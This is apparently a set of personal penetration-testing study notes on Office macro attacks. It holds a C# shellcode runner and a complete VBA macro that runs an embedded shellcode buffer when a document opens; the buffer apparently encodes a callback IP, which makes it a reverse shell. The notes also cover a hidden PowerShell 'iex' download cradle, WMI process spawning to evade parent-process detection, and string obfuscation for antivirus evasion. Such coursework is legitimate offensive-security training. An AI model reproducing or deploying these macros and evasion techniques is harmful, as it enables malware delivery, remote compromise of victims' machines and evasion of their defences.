
## To Do:
1. 6.8.2 - Update the PowerShell shellcode runner to 64-bit.
2. rc4 encryption and macro obfuscation
3. test those against AV
### Shellcode Runner Again

- Main body consists of the following
```csharp
			int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
```
- `btye[] buf = new byte[###] {...}`
- VirtualAlloc is a Win32 function call and is imported into C# using 

### Using CsWin32 source generator

- Create project in VS Studio Code (C# Console or C# .Net Console app)
- Project needs to be sdk type
- Search for cswin32 and install
- ![[InstallCsWin32.png]]
- need to add addition nuget System.Memory package as well
```ps1

dotnet add package System.Memory

```
- or using VS Code
- ![[NuGetSystemMemory.png]]

- create NativeMethods.txt file in project
- Allow unsafe code
- ![[AllowUnsafeCode.png]]

**TODO** : Not Quite working for me yet. PInvoke."type" mapping doesn't match what was in the mapping from Offsec. Need to go through MS Docs.


### MS Office
- VBA Script to execute payload in memory
```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
...
49, 57, 50, 46, 49, 54, 56, 46, 49, 55, 54, 46, 49, 52, 50, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub

End Function
```


### Powershell inside VBA

- Download cradle: hide a `powershell -exec bypass -nop -c iex()` inside a macro as a starting point
- call Shell stringArg, vbHide which will trigger some AV products
- problem is that Powershell becomes a child process of the calling MS Office program
- _Windows Management Instrumentation_ (WMI) framework can be leveraged to move around this
	- "**Windows Management Instrumentation** (**WMI**) consists of a set of extensions to the [Windows Driver Model](https://en.wikipedia.org/wiki/Windows_Driver_Model "Windows Driver Model") that provides an [operating system](https://en.wikipedia.org/wiki/Operating_system "Operating system") interface through which [instrumented](https://en.wikipedia.org/wiki/Instrumentation_(computer_programming) "Instrumentation (computer programming)") components provide information and notification." (https://en.wikipedia.org/wiki/Windows_Management_Instrumentation)
- Leverage WMI for process creation bypassing of MS Office and use WMI for the parent process
- To create a process, will need to use Win32_Process to instantiate
```vb
Sub MyMacro
  strArg = "powershell"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```
- this will create a child Powershell process of the parent process Wmiprvse.exe

### TODO: re 64 vs 32 bit code (need to test this out)

- to circumvent running powershell in 32-bit mode on 64-bit system, one can use the Sysnative directory
- The **Sysnative** folder is only available in a 64-bit Windows
```powershell
%windir%\sysnative\WindowsPowerShell\v1.0\powershell.exe -file myScript.ps1
```
- can try checking directory and if exists, run 64-bit; otherwise, run 32-bit
```vb
If My.Computer.FileSystem.DirectoryExists("C:\backup\logs") Then
    Dim logInfo = My.Computer.FileSystem.GetDirectoryInfo(
        "C:\backup\logs")
End If
```


### TODO: check out EvilClippy

#### Obfuscation methods:

- StrReverse (string reverse) to break signature detection of WMI calls, etc...
- create a function that just calls StrReverse so that VBA code isn't littered with StrReverse calls 
- convert strings to charcode and encrypt the string
- obfuscate variable and function names
